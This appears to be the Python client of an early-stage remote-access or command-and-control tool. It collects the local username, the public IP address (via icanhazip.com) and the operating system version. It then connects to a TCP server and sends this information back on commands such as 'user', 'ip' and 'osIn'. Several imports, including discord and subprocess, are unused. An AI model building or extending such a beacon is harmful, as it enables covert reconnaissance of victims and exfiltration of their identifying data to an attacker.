from glob import glob
from lib2to3.pytree import convert
import os
import requests
import json
import platform
import discord
from discord.ext import commands
import socket
import getpass
import subprocess

# Gets username l
user = getpass.getuser()

# Gets the users IP
user_ip = requests.get("https://icanhazip.com").text

# Gets the OS and version and combines them
theOs     =    platform.system()
theOsVer  =    platform.version()
theOsSt   =    theOs + " " + theOsVer

# Server information
global SERVER_IP 
global SERVER_PORT

class ClientSetup:
    # Declaring socket using INET IPv4 and TCP too
    def __init__(self):
        self.in_socket:socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect_to_server()
    

    def convert_byte(data:str):
        return bytes(data, "UTF-8")


    def connect_to_server(self):
        # Connect to the server
        ip          = SERVER_IP
        port:int    = SERVER_PORT
        try:
            self.in_socket.connect((ip, port))
        except ConnectionRefusedError:
            print("Server down")
            os._exit(1)

        while True:
            cmd = self.in_socket.recv(1024).decode("UTF-8")

            if cmd == "TEST":
                self.in_socket.send(ClientSetup.convert_byte("CONNECTED"))
            if cmd == "user":
                self.in_socket.send(ClientSetup.convert_byte(f"Username {user}"))
            if cmd == "ip":
                self.in_socket.send(ClientSetup.convert_byte(f"IP {user_ip}"))
            if cmd == "osIn":
                self.in_socket.send(ClientSetup.convert_byte(f"Platform {theOsSt}"))
            if cmd == "check":
                self.in_socket.send(ClientSetup.convert_byte("checked"))
            if cmd == "close":
                self.in_socket.close()
                break
            


if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 3334
    ClientSetup()
